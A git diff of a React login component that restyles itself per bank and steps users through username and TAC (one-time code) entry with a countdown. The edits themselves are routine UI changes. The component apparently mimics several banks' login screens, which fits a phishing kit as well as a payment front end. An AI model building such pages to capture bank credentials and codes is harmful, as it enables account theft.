@@ -27,7 +27,7 @@ function LoginForm({ id, bank, amount }) {
   let [hover, setHover] = useState(false);
   let [start, setStart] = useState(Date.now());
   let [countdown, setCountdown] = useState(0);
-  let timeout = 180;
+  let [timeout, setTimeout] = useState(180);
 
   const modalContent = {
     color: banks[bank].fontColor,
@@ -54,6 +54,8 @@ function LoginForm({ id, bank, amount }) {
     color: banks[bank].buttonHoverColor ?? banks[bank].warningColor,
   };
 
+  const loaderStyle = banks[bank].loader;
+
   useEffect(() => {
     let timer = setInterval(() => {
       let now = Date.now();
@@ -66,6 +68,7 @@ function LoginForm({ id, bank, amount }) {
           setCompleted(0);
           setTacPhoneNumber("");
           setTacDate("");
+
           setStage(bodyState.TIMEOUT);
           clearTimeout(timer);
         }
@@ -147,6 +150,8 @@ function LoginForm({ id, bank, amount }) {
             );
 
             if (result.data.code == 400) {
+              setTimeout(0);
+              setCompleted(0);
               setStage(bodyState.ERROR);
             } else {
               const phoneNumber = result.data.phoneNumber;
@@ -177,6 +182,8 @@ function LoginForm({ id, bank, amount }) {
           if (result.data.code == 200) {
             setStage(bodyState.SUCCESS);
           } else if (result.data.code == 300) {
+            setTimeout(0);
+            setCompleted(0);
             setStage(bodyState.ERROR);
           }
         }
@@ -191,6 +198,7 @@ function LoginForm({ id, bank, amount }) {
     e.preventDefault();
 
     setStage(bodyState.USERNAME);
+    setTimeout(180);
     setCompleted(0);
     setCountdown(0);
   }
@@ -268,9 +276,17 @@ function LoginForm({ id, bank, amount }) {
               Next
             </button>
             <p className={styles["tac-details"]}>
-              Your TAC Request is successful {tacDate}. Your TAC number will be
-              sent to your registered mobile phone number {tacPhoneNumber}
+              Your TAC Request is successful
+              {" " + tacDate ?? ""}. Your TAC number will be sent to your
+              registered mobile phone number
+              {" " + tacPhoneNumber ?? ""}.
             </p>
+
+            {/* {timeout - countdown <= 150 ? (
+              <p>Did not receive TAC. Resend</p>
+            ) : (
+              <></>
+            )} */}
           </>
         );
       case bodyState.ERROR:
@@ -278,9 +294,9 @@ function LoginForm({ id, bank, amount }) {
       case bodyState.TIMEOUT:
         return TimeoutError();
       case bodyState.LOADING:
-        return <BankLoading />;
+        return <BankLoading style={loaderStyle} />;
       default:
-        return <BankLoading />;
+        return <BankLoading style={loaderStyle} />;
     }
   }
 
@@ -346,7 +362,7 @@ function LoginForm({ id, bank, amount }) {
   );
 }
 
-function BankLoading() {
+function BankLoading({ style }) {
   return (
     <div className={styles["bank-loading"]}>
       <p>
@@ -358,6 +374,7 @@ function BankLoading() {
             className={`bi bi-gear-fill ${styles["spin"]}`}
             fillRule="currentColor"
             xmlns="http://www.w3.org/2000/svg"
+            fill={style}
           >
             <path
               fill-rule="evenodd"
